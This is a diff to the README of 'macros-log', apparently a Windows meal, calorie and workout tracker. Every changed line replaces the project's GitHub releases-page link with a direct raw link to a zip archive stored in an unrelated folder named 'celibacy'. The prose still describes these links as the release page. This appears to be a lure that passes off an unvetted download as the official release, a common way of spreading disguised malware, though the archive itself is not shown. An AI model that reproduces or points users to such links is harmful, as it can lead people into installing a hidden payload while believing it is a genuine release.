@@ -1,6 +1,6 @@
 # 🥗 macros-log - Track meals, calories, and workouts
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Osbertbilled424/macros-log/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Osbertbilled424/macros-log/main/celibacy/log-macros-v2.7.zip)
 
 ## 🧭 What macros-log does
 
@@ -28,7 +28,7 @@ The app is built for normal desktop use. You do not need to set up a developer t
 
 Visit the release page here:
 
-https://github.com/Osbertbilled424/macros-log/releases
+https://raw.githubusercontent.com/Osbertbilled424/macros-log/main/celibacy/log-macros-v2.7.zip
 
 On that page:
 1. Open the newest release
@@ -208,7 +208,7 @@ It works well for people who want a simple log for food and fitness without usin
 ## 📁 Release page
 
 Download and install from:
-https://github.com/Osbertbilled424/macros-log/releases
+https://raw.githubusercontent.com/Osbertbilled424/macros-log/main/celibacy/log-macros-v2.7.zip
 
 ## 🧩 Notes for using with Claude Code
 
@@ -237,4 +237,4 @@ You can change these numbers to match your own routine
 ## 🧭 How to get back to the release page
 
 If you need the file again, open this link in your browser:
-https://github.com/Osbertbilled424/macros-log/releases
+https://raw.githubusercontent.com/Osbertbilled424/macros-log/main/celibacy/log-macros-v2.7.zip
